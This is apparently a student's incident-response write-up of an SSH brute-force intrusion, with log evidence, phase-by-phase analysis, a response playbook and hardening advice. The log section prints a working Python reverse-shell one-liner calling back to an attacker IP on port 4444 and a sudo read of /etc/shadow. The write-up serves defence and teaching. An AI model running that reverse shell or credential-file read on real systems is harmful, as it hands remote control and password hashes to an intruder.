# Case Study 01: SSH Brute Force & Python Reverse Shell 

## 1. Executive Summary
During a proactive log review, I identified a successful brute-force attack targeting a developer account. 
The attacker successfully gained access, attempted to escalate privileges, and established a persistent backdoor using a Python-based reverse shell.

## 2. Evidence (Raw Logs)
The following logs were extracted from `/var/log/auth.log` on the compromised host:


Feb 16 21:00:01 srv sshd[100]: Failed password for root from 185.122.10.45 port 55432
Feb 16 21:05:20 srv sshd[105]: Accepted password for developer from 185.122.10.45 port 55438
Feb 16 21:06:00 srv sudo: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Feb 16 21:06:05 srv sudo: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/usr/bin/python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("185.122.10.45",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'

## 3. Technical Analysis & Investigation
### Phase 1: Initial Access (Brute-Force)
* **Observation:** Multiple failed login attempts for `root` followed by a successful login for the `developer` account from IP `185.122.10.45`.
* **Conclusion:** The attacker used a dictionary attack to compromise the developer's credentials.

### Phase 2: Privilege Escalation Attempt
* **Observation:** Immediately after login, the attacker executed `sudo cat /etc/shadow`.
* **Conclusion:** The goal was to steal password hashes for further offline cracking.

### Phase 3: Persistence (Reverse Shell)
* **Observation:** The attacker executed a Python-based one-liner to connect back to their command-and-control (C2) server.
* **Payload Breakdown:**
    * `socket.connect(("185.122.10.45", 4444))`: Initiates an outbound connection to the attacker's IP.
    * `os.dup2(s.fileno(), f)`: Redirects standard input, output, and error to the network socket.
    * `pty.spawn("/bin/bash")`: Provides the attacker with a fully interactive shell.
* **Conclusion:** The attacker established a "Reverse Shell" to bypass firewall restrictions on inbound connections.

## 4. Incident Response (Playbook)

| **Containment** | Blocked IP `185.122.10.45` via `iptables`. Terminated all active sessions for user `developer`. |
| **Eradication** | Killed the malicious Python process. Verified `/etc/crontab` for hidden persistence. |
| **Recovery** | Forced a global password reset for all users. Restored system from a known-clean backup. |

## 5. Chain of Custody (Legal Perspective)
As a law student specializing in cybersecurity, I ensured that all logs were hashed and archived using `sha256sum` to maintain integrity for potential digital forensic evidence. No data was modified on the original host during the collection phase.

## 6. Security Recommendations
* **Disable Password Auth:** Enforce SSH Key-based authentication only.
* **Rate Limiting:** Implement `Fail2Ban` to block IPs after 3 failed attempts.
* **Egress Filtering:** Restrict outbound traffic on non-standard ports (like 4444) to prevent Reverse Shells.
